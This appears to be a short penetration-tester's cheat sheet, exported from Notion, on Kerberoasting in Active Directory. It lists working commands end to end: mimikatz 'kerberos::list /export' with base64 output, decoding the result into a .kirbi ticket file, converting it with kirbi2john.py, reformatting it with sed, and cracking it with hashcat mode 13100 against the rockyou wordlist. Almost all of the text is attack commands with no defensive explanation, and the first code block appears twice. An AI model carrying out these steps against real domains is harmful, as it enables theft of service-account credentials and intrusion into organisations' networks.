# Mimikatz: Export Kerberos Tickets Base64 and Crack

OS: Active_Directory
Description: Mimikatz: Export Kerberos Tickets Base64 and Crack
Security Domains: Credential Access (https://www.notion.so/Credential-Access-1444c8e523768003b6fde866419041dc?pvs=21)
Target_Technology: PowerShell (https://www.notion.so/PowerShell-1434c8e52376805dba60efbabdb026bf?pvs=21), mimikatz (https://www.notion.so/mimikatz-1464c8e5237680df8de9d1588f8d4980?pvs=21)

```jsx
base64 /out:true
kerberos::list /export  
```

```jsx
base64 /out:true
kerberos::list /export  
```

### Take the base64 file created and eliminate newline characters

- Eliminate newline characters from file

```jsx
echo "<base64 blob>" |  tr -d \\n 
```

### Create a .kirbi file

```jsx
cat encoded_file | base64 -d > sqldev.kirbi
```

### Use Kirbi toJohn

```jsx
https://raw.githubusercontent.com/nidem/kerberoast/907bf234745fe907cf85f3fd916d1c14ab9d65c0/kirbi2john.py
```

```jsx
python2.7 kirbi2john.py sqldev.kirbi
```

### Modify the output file for hashcat

```jsx
sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > sqldev_tgs_hashcat
```

### Hashcat it up

```jsx
hashcat -m 13100 sqldev_tgs_hashcat /usr/share/wordlists/rockyou.txt 
```